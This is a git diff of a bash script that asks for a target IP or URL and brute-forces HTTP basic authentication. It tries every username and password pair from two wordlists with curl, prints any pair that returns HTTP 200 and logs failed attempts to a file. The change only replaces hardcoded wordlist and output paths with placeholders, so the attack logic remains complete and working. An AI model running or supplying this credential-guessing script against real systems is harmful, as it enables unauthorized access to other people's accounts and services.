@@ -34,13 +34,13 @@ sleep 2
 read -p " Input Target IP or URL and Hit Enter: " ADDRESS
 
 url=$ADDRESS
-for user in $(cat ~/Desktop/1nks/letmein/user.txt); do 
-  for pass in $(cat ~/Desktop/1nks/letmein/pass.txt); do
+for user in $(cat <path to user wordlist>); do 
+  for pass in $(cat <path to pwd wordlist>); do
     http_code=$(curl -v -L -u "$user":"$pass" "$url" -w '%{http_code}' -o /dev/null -s)
     if [[ $http_code -eq 200 ]]; then
       echo "Success: Address:'$ADDRESS' User:'$user' Pass:'$pass'"
       break
-else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> ~/Desktop/1nks/letmein/status.txt
+else echo  "Failed: "$user" and "$pass" on "$ADDRESS"" >> <location to save outfile and desired file name>
     fi
   done
 done
